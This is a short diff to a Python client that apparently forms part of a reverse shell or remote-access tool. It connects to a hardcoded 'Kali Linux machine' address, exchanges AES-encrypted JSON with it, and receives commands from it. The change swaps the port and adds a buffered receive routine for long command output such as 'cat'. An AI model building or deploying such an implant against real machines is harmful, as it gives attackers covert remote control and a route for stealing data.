@@ -6,7 +6,7 @@ from Crypto.Cipher import AES
 
 
 SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
-SERVER_PORT = 8887
+SERVER_PORT = 8888
 
 #Step 4: Authentication
 key = b'\x91)\xdd\xa9\x06\xaa\x8d\xb2\xbd\x7fY\x84! \x99\xcb'
@@ -37,10 +37,22 @@ def send(data):
     json_data = json.dumps(message)
     client_sock.send(json_data.encode('utf-8'))
 
-
+# This method for "cat" command line
+def recv_until_nomore():
+    ret = ''
+    client_sock.settimeout(1)
+    chunk = client_sock.recv(1024).decode('utf-8')
+    while chunk:
+        ret += chunk
+        try:
+            chunk = client_sock.recv(1024).decode('utf-8')
+        except socket.timeout:
+            break
+    return ret
 
 def recv_command():
-    data = client_sock.recv(1024).decode('utf-8')
+    # data = client_sock.recv(1024).decode('utf-8')
+    data = recv_until_nomore()
     try:
         message = json.loads(data)
         nonce = base64.b64decode(message['nonce'])
